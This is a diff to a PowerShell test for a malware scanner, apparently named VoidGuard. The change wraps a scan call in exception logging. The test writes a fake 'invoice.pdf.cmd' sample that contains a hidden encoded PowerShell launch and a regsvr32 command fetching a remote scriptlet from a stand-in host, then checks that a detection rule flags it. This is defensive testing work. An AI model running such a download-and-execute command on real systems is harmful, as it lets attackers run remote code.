@@ -108,7 +108,15 @@ try {
     $samplePath = Join-Path $tempRoot 'invoice.pdf.cmd'
     "@echo off`r`npowershell.exe -WindowStyle Hidden -EncodedCommand AAAA`r`nregsvr32.exe /s /n /u /i:https://example.invalid/demo.sct scrobj.dll" |
         Set-Content -LiteralPath $samplePath -Encoding ASCII
-    $finding = Test-VoidGuardFile -Path $samplePath -Context $context -KnownBadHashes @{} -RuleEngine $engine
+    try {
+        $finding = Test-VoidGuardFile -Path $samplePath -Context $context -KnownBadHashes @{} -RuleEngine $engine
+    } catch {
+        Write-Host '--- SCANNER EXCEPTION ---' -ForegroundColor Red
+        Write-Host ($_.Exception.ToString()) -ForegroundColor Red
+        Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
+        Write-Host ($_.InvocationInfo.PositionMessage) -ForegroundColor Yellow
+        throw
+    }
     if (-not $finding -or $finding.Score -lt 40) { throw 'Heuristic sample did not cross the expected score.' }
     if (@($finding.RuleMatches | Where-Object { $_.Rule -eq 'VG-LOL-001' }).Count -ne 1) {
         throw 'Core rule VG-LOL-001 did not match the defensive sample.'
